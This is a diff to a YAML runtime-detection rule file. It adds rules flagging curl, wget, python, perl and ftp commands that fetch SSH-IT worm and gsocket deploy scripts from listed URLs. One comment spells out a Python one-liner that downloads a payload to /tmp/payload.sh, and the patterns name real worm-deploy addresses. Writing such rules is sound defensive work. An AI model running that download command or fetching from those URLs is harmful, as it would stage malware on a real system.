@@ -14,4 +14,23 @@
     the SSH-IT worm, which intercepts outgoing SSH connections every time a user uses ssh.
   condition: (payload.filename ENDS_WITH "/curl" OR payload.filename ENDS_WITH "/wget")
    AND (payload.argv CONTAINS "https://thc.org/ssh-it/x" OR payload.argv CONTAINS "http://nossl.segfault.net/ssh-it-deploy.sh" 
-   OR payload.argv CONTAINS "https://gsocket.io/x" OR payload.argv CONTAINS "https://thc.org/ssh-it/bs" OR payload.argv CONTAINS "http://nossl.segfault.net/bs")
+   OR payload.argv CONTAINS "https://gsocket.io/x" OR payload.argv CONTAINS "https://thc.org/ssh-it/bs" OR payload.argv CONTAINS "http://nossl.segfault.net/bs"
+   OR payload.argv CONTAINS "http://example.com"
+   )
+
+
+# argv: [ python3, -c, import urllib.request; urllib.request.urlretrieve('http://example.com', '/tmp/payload.sh') ]
+# problem to get the urls
+- name: Script-based connection to specific address
+  type: Exec
+  category: lateral_movement
+  severity: medium
+  description: Detects use of scripting tools for specific connections. Attackers may use these tools to download
+    the SSH-IT worm, which intercepts outgoing SSH connections every time a user uses ssh.
+  condition: (payload.filename ENDS_WITH "/python" OR payload.filename ENDS_WITH "/python3"
+    OR payload.filename ENDS_WITH "/ftp"
+    OR payload.filename ENDS_WITH "/perl")
+    AND (payload.argv CONTAINS "http://nossl.segfault.net"
+    OR payload.argv CONTAINS "https://thc.org/ssh-it"
+    OR payload.argv CONTAINS "https://gsocket.io"
+    OR payload.argv CONTAINS "http://example.com")
